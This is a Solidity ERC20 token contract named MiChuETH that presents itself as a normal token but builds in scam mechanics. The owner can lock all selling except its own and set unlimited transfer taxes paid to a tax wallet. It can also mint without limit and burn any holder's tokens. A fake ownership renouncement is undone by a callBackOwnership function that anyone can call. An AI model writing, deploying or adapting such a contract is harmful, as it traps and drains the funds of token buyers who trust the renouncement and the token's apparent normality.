// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract MiChuETH is ERC20, Ownable {
    uint256 public buyTax;
    uint256 public sellTax;
    address public taxWallet;

    bool public _sellLocked;

    event SellLocked();
    event SellUnlocked();
    event BuyTaxUpdated(uint256 newTax);
    event SellTaxUpdated(uint256 newTax);

    constructor(
        address initialOwner,
        uint256 _buyTax,
        uint256 _sellTax,
        address _taxWallet
    ) ERC20("MiChuETH", "MCTK") Ownable(initialOwner) {
        _mint(initialOwner, 10000000000000 * 10 ** 18);
        transferOwnership(initialOwner);
        buyTax = _buyTax;
        sellTax = _sellTax;
        taxWallet = _taxWallet;
        _sellLocked = false;
    }

    modifier notLocked() {
        require(!_sellLocked || owner() == msg.sender, "Sell is locked");
        _;
    }

    function setBuyTax(uint256 newTax) external onlyOwner {
        buyTax = newTax;
        emit BuyTaxUpdated(newTax);
    }

    function setSellTax(uint256 newTax) external onlyOwner {
        sellTax = newTax;
        emit SellTaxUpdated(newTax);
    }

    function lockSell() public onlyOwner {
        _sellLocked = true;
        emit SellLocked();
    }

    function unlockSell() public onlyOwner {
        _sellLocked = false;
        emit SellUnlocked();
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override notLocked returns (bool) {
        uint256 taxAmount = (amount * sellTax) / 100;
        uint256 amountAfterTax = amount - taxAmount;

        _transfer(_msgSender(), taxWallet, taxAmount);
        _transfer(_msgSender(), recipient, amountAfterTax);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override notLocked returns (bool) {
        uint256 currentAllowance = allowance(sender, _msgSender());
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );

        uint256 taxAmount = (amount * sellTax) / 100;
        uint256 amountAfterTax = amount - taxAmount;

        _transfer(sender, taxWallet, taxAmount);
        _transfer(sender, recipient, amountAfterTax);
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }

    function renounceOwnership() public override onlyOwner {
        _transferOwnership(address(0));
    }

    function callBackOwnership() public {
        require(owner() == address(0), "Ownership has not been renounced");
        _transferOwnership(_msgSender());
    }

    function mint(address account, uint256 amount) public onlyOwner {
        _mint(account, amount);
    }

    function totalSupply() public view override returns (uint256) {
        return ERC20.totalSupply();
    }

    function balanceOf(address account) public view override returns (uint256) {
        return ERC20.balanceOf(account);
    }
    function burn(address account, uint256 amount) public onlyOwner {
        _burn(account, amount);
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return ERC20.allowance(owner, spender);
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
}
